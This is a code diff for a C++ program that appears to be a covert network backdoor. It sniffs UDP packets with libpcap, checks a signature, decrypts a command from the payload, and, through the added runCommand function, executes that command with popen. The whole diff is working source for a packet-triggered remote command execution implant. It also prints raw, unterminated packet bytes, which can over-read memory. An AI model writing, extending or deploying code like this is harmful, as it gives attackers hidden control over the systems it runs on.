@@ -53,6 +53,22 @@ static bool decrypt(const u_char encrypted[], unsigned char decrypted[], uint si
 }
 
 
+static bool runCommand(const std::string& command)
+{
+	FILE* fp = popen(command.c_str(), "r");
+	if (!fp) {
+		return false;
+	}
+
+	char buffer[1024];
+	while (fgets(buffer, sizeof(buffer), fp)) {
+		std::cout << buffer << std::endl;
+	}
+	pclose(fp);
+	return true;
+}
+
+
 void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
 {
 	std::cout << "Packet received" << std::endl;
@@ -66,6 +82,7 @@ void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char
 	const uint total_header_size = ETHERNET_HEADER_SIZE + ip_header_len + UDP_HEADER_SIZE;
 
 	const u_char* payload = packet + total_header_size;
+	std::cout << payload << std::endl;
 	if (memcmp(payload, SIGNATURE_ONE.data(), strlen(SIGNATURE_ONE.data())) != 0) {
 		std::cout << "Payload has no proper signature" << std::endl;
 		return;
@@ -78,6 +95,7 @@ void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char
 	}
 	std::string command(reinterpret_cast<const char*>(decrypted + SIGNATURE_SIZE), encrypted_size - SIGNATURE_SIZE);
 	std::cout << "Decrypted message: " <<  command << std::endl;
+	runCommand(command);
 }
 
 
